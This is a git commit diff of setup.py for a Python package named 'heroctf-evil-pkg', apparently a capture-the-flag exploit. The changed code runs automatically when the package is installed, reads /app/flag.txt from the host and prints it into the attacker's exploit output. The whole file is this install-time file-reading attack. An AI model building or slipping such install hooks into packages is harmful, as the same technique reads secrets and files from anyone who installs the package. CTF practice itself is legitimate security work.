a7d0b755562fde355137ddf51587531df6ff1390
ExWhyZed04 <139464515+ExWhyZed04@users.noreply.github.com>
2025-11-30 15:24:25 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,16 +1,20 @@
 from setuptools import setup
 import os
+import sys
 
-try:
-    flag_path = "/app/flag.txt"
-    if os.path.exists(flag_path):
-        with open(flag_path, "r") as f:
-            print(f.read())
-except Exception as e:
-    print(e)
+def print_flag():
+    try:
+        flag = open("/app/flag.txt").read()
+    except Exception as e:
+        print("[!] Error reading flag:", e, file=sys.stderr)
+    else:
+        # this text will be printed into your exploit output
+        print("FLAG_FROM_SETUP:", flag)
+
+print_flag()
 
 setup(
     name="heroctf-evil-pkg",
     version="0.1",
-    py_modules=[],
+    py_modules=["dummy"],
 )
